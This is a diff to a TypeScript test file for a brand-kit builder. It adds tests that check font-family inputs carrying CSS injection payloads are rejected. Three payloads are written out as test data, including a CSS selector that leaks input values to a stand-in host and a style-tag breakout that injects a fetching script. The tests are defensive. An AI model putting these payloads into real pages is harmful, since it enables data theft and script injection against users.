@@ -174,3 +174,34 @@ describe("buildBrandKit — input validation", () => {
     ).toThrow(/typography\.body/);
   });
 });
+
+describe("buildBrandKit — font-stack injection gate (B1: stored CSS injection)", () => {
+  // The three payloads confirmed exploitable in the B1 code-review finding.
+  const HOSTILE_FONT_STACKS = [
+    "Inter; } html{display:none} :root{ ",
+    'x; } input[value^="a"]{background:url(https://evil.example/a)} :root{',
+    'x</style><script>fetch("https://evil.example")</script>',
+  ] as const;
+
+  it("throws on each confirmed payload, on every face, before any CSS can be emitted", () => {
+    for (const payload of HOSTILE_FONT_STACKS) {
+      for (const face of ["display", "body", "mono"] as const) {
+        expect(() =>
+          buildBrandKit({
+            colors: { accent: "#e3a94f" },
+            typography: { [face]: payload },
+          })
+        ).toThrow(new RegExp(`typography\\.${face} is not a valid CSS font-family list`));
+      }
+    }
+  });
+
+  it("preserves a legitimate multi-family stack exactly", () => {
+    const stack = '"Space Grotesk", "Helvetica Neue", Arial, sans-serif';
+    const { kit } = buildBrandKit({
+      colors: { accent: "#e3a94f" },
+      typography: { display: stack },
+    });
+    expect(kit.tokens.typography.display).toBe(stack);
+  });
+});
